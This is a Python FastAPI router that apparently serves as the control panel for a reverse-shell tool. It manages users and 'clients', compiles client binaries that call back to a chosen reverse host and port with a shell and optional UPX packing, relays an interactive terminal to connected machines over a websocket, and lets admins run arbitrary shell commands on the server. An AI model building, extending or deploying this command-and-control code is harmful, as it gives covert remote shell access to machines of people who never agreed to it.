import asyncio
import logging
import uuid
from pathlib import Path
from secrets import token_urlsafe

import sqlalchemy as sa
from fastapi import APIRouter, HTTPException, Response, WebSocket
from fastapi.responses import FileResponse, HTMLResponse
from sqlalchemy import orm
from starlette.status import (
    HTTP_204_NO_CONTENT,
    HTTP_403_FORBIDDEN,
    HTTP_404_NOT_FOUND,
    HTTP_409_CONFLICT,
    HTTP_500_INTERNAL_SERVER_ERROR,
)

from ..client import compile_client
from ..utils import PortNumber, join_async_streams
from .auth import (
    UserSessionDependency,
    UserSessionQueryDependency,
    login,
    require_role,
    rotate_session,
)
from .config import SettingsDependency
from .connections import ConnectionsManagerDependency
from .db import Clients, DatabaseSessionDependency, UserRoles, Users
from .models import (
    ClientCreation,
    ClientResponse,
    HostCommandRequest,
    HostCommandResponse,
    ListClientResponse,
    ListUserResponse,
    SessionCreation,
    SessionCreationResponse,
    UserCreation,
    UserCreationResponse,
)

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api")


@router.post("/session")
async def create_session(
    model: SessionCreation,
    db: DatabaseSessionDependency,
    settings: SettingsDependency,
) -> SessionCreationResponse:
    session, token = await login(model.username, model.password, db, settings)
    return SessionCreationResponse(session_data=session, token=token)


@router.get("/session/me")
async def get_session(
    user: UserSessionDependency, db: DatabaseSessionDependency
) -> ListUserResponse:
    return await get_user(user.uid, db)


@router.delete("/session", response_model=None, status_code=HTTP_204_NO_CONTENT)
async def delete_session(user: UserSessionDependency, db: DatabaseSessionDependency):
    await rotate_session(user.username, db)


@router.put("/user/init")
async def create_initial_user(
    model: UserCreation, db: DatabaseSessionDependency, settings: SettingsDependency
) -> SessionCreationResponse:
    result = await db.scalars(sa.func.count(Users.role == UserRoles.admin))
    if result.first():
        raise HTTPException(HTTP_403_FORBIDDEN, "Admin user already exists")
    await db.execute(
        sa.insert(Users).values(**model.model_dump(), role=UserRoles.admin)
    )
    await rotate_session(model.username, db)
    session, token = await login(model.username, model.password, db, settings)
    return SessionCreationResponse(session_data=session, token=token)


@router.put("/user", dependencies=[require_role(UserRoles.admin)])
async def create_user(
    model: UserCreation, db: DatabaseSessionDependency
) -> UserCreationResponse:
    result = await db.execute(
        sa.insert(Users)
        .values(**model.model_dump(), role=UserRoles.user)
        .returning(Users)
    )
    if (result := result.first()) is None:
        raise HTTPException(HTTP_500_INTERNAL_SERVER_ERROR, "Failed to create user")
    user, *_ = result.tuple()
    await rotate_session(model.username, db)
    await db.refresh(user)
    return UserCreationResponse.model_validate(user)


@router.get("/user", dependencies=[require_role(UserRoles.admin)])
async def list_users(
    db: DatabaseSessionDependency,
) -> list[ListUserResponse]:
    users = await db.scalars(sa.select(Users).options(orm.joinedload(Users.clients)))
    return [ListUserResponse.model_validate(user) for user in users.unique()]


@router.delete(
    "/user/{user_id}",
    dependencies=[require_role(UserRoles.admin)],
    status_code=HTTP_204_NO_CONTENT,
)
async def delete_user(
    user_id: int,
    db: DatabaseSessionDependency,
):
    result = await db.scalars(sa.select(Users).where(Users.id_ == user_id))
    if (user := result.first()) is None:
        raise HTTPException(HTTP_404_NOT_FOUND, "User not found")
    await db.delete(user)
    return


@router.get("/user/{user_id}", dependencies=[require_role(UserRoles.admin)])
async def get_user(
    user_id: int,
    db: DatabaseSessionDependency,
) -> ListUserResponse:
    user = await db.scalars(
        sa.select(Users)
        .where(Users.id_ == user_id)
        .options(orm.joinedload(Users.clients))
    )
    if (user := user.first()) is None:
        raise HTTPException(HTTP_404_NOT_FOUND, "User not found")
    return ListUserResponse.model_validate(user)


@router.delete(
    "/user/{user_id}/session",
    dependencies=[require_role(UserRoles.admin)],
    status_code=HTTP_204_NO_CONTENT,
)
async def delete_user_session(
    user_id: int,
    db: DatabaseSessionDependency,
):
    result = await db.execute(
        sa.update(Users)
        .where(Users.id_ == user_id)
        .values(jwt_secret=None)
        .returning(Users.username)
    )
    if (username := result.scalar()) is None:
        raise HTTPException(HTTP_404_NOT_FOUND, "User not found")
    await rotate_session(username, db)
    return


@router.put("/client", dependencies=[require_role(UserRoles.user)])
async def create_client(
    model: ClientCreation,
    user: UserSessionDependency,
    db: DatabaseSessionDependency,
    connections_manager: ConnectionsManagerDependency,
) -> ClientResponse:
    result = await db.execute(
        sa.insert(Clients)
        .values(
            **model.model_dump(),
            owner_id=user.uid,
            encrypt_key=token_urlsafe(24),
        )
        .returning(Clients)
    )
    if (result := result.first()) is None:
        raise HTTPException(HTTP_500_INTERNAL_SERVER_ERROR, "Failed to create client")
    client, *_ = result
    await connections_manager.init_encryption_keys()
    return ClientResponse.model_validate(client)


@router.get("/client", dependencies=[require_role(UserRoles.user)])
async def list_clients(
    user: UserSessionDependency,
    db: DatabaseSessionDependency,
    connections_manager: ConnectionsManagerDependency,
) -> list[ListClientResponse]:
    stmt = sa.select(Clients)
    if user.role > UserRoles.admin:
        stmt = stmt.filter(Clients.owner_id == user.uid)
    clients = await db.scalars(
        stmt.order_by(Clients.last_seen.desc()).options(orm.joinedload(Clients.owner))
    )
    return [
        ListClientResponse.model_validate(
            {
                "online": client.id_ in connections_manager.connections,
                "owner_id": client.owner.id_,
                "owner_name": client.owner.username,
                "info": client,
            }
        )
        for client in clients.all()
    ]


@router.get(
    "/client/{client_id}/binary",
    dependencies=[require_role(UserRoles.user)],
    response_class=Response,
)
async def download_client_binary(
    client_id: uuid.UUID,
    user: UserSessionDependency,
    db: DatabaseSessionDependency,
    arch: str = "x86_64",
    shell: str = "/bin/sh",
    reverse_host: str = "127.0.0.1",
    reverse_port: PortNumber = 2333,
    upx: bool = False,
):
    stmt = sa.select(Clients).where(Clients.id_ == client_id)
    if user.role > UserRoles.admin:
        stmt = stmt.where(Clients.owner_id == user.uid)
    client = await db.scalars(stmt)
    if (client := client.first()) is None:
        raise HTTPException(HTTP_404_NOT_FOUND, "Client not found")
    try:
        compiled_client = await compile_client(
            client.encrypt_key,
            (reverse_host, reverse_port),
            target_arch=arch,
            shell_command=shell,
            upx=upx,
        )
    except RuntimeError as e:
        raise HTTPException(
            HTTP_500_INTERNAL_SERVER_ERROR, f"Failed to compile client: {e!r}"
        ) from e

    return Response(
        compiled_client,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{client.client_name}"'},
    )


@router.get(
    "/client/{client_id}/connect",
    name="client_front_page",
    response_class=HTMLResponse,
)
async def connect_front_page(
    client_id: uuid.UUID,
    user: UserSessionQueryDependency,
):
    return HTMLResponse(
        (Path(__file__).parent / "terminal.html").read_text(),
    )


@router.websocket("/client/{client_id}/connect")
async def connect_client(
    client_id: uuid.UUID,
    user: UserSessionQueryDependency,
    db: DatabaseSessionDependency,
    connections_manager: ConnectionsManagerDependency,
    websocket: WebSocket,
):
    if user.role > UserRoles.user:
        raise HTTPException(HTTP_403_FORBIDDEN, "Unauthorized access")
    stmt = sa.select(Clients).where(Clients.id_ == client_id)
    if user.role > UserRoles.admin:
        stmt = stmt.where(Clients.owner_id == user.uid)
    client = await db.scalars(stmt)
    if (client := client.first()) is None:
        raise HTTPException(HTTP_404_NOT_FOUND, "Client not found")
    if client.id_ not in connections_manager.connections:
        raise HTTPException(HTTP_409_CONFLICT, "Client is not online")
    prot, send_cli_stream, recv_cli_stream = connections_manager.connections[client.id_]

    await websocket.accept()
    recv_ws_stream = websocket.iter_bytes()

    try:
        async for stream, result in join_async_streams(recv_cli_stream, recv_ws_stream):
            if stream is recv_cli_stream:
                await websocket.send_bytes(result)
            if stream is recv_ws_stream:
                await send_cli_stream.send(result)
    except Exception:
        logger.exception("Error during client %r communication", client.client_name)

    await websocket.close()
    prot.connection_lost(None)


@router.delete(
    "/client/{client_id}",
    dependencies=[require_role(UserRoles.user)],
    status_code=HTTP_204_NO_CONTENT,
)
async def delete_client(
    client_id: uuid.UUID,
    user: UserSessionDependency,
    db: DatabaseSessionDependency,
    connections_manager: ConnectionsManagerDependency,
):
    stmt = sa.delete(Clients).where(Clients.id_ == client_id)
    if user.role > UserRoles.admin:
        stmt = stmt.where(Clients.owner_id == user.uid)
    result = await db.execute(stmt)
    if result.rowcount == 0:
        raise HTTPException(HTTP_404_NOT_FOUND, "Client not found")
    if connection := connections_manager.connections.get(client_id):
        protocol, *_ = connection
        protocol.connection_lost(None)
    await connections_manager.init_encryption_keys()
    return


@router.post("/host/command", dependencies=[require_role(UserRoles.admin)])
async def run_host_command(command: HostCommandRequest) -> HostCommandResponse:
    process = await asyncio.subprocess.create_subprocess_shell(
        command.command,
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await process.communicate(command.stdin)
    try:
        await asyncio.wait_for(process.wait(), timeout=5)
    except TimeoutError:
        process.kill()
    return HostCommandResponse(
        status=process.returncode or 0,
        stdout=stdout,
        stderr=stderr,
    )


@router.get(
    "/host/files/{file_path:path}",
    response_class=FileResponse,
    dependencies=[require_role(UserRoles.user)],
)
async def host_file_share(file_path: Path):
    if not file_path.exists():
        raise HTTPException(HTTP_404_NOT_FOUND, "File not found")
    # check if path traversal attack is possible
    if file_path != Path() and Path().resolve() not in file_path.resolve().parents:
        raise HTTPException(HTTP_403_FORBIDDEN, "Forbidden path")
    if file_path.is_dir():
        return HTMLResponse(
            "<ul>{}</ul>".format(
                "".join(
                    f'<li><a href="./{sub_path.name}">'
                    + (sub_path.name + ("/" if sub_path.is_dir() else ""))
                    + f"</a> - <code>{sub_path.stat().st_size}</code> bytes</li>"
                    for sub_path in sorted(
                        file_path.iterdir(), key=lambda p: (not p.is_dir(), p.name)
                    )
                )
            ),
        )
    return FileResponse(file_path)
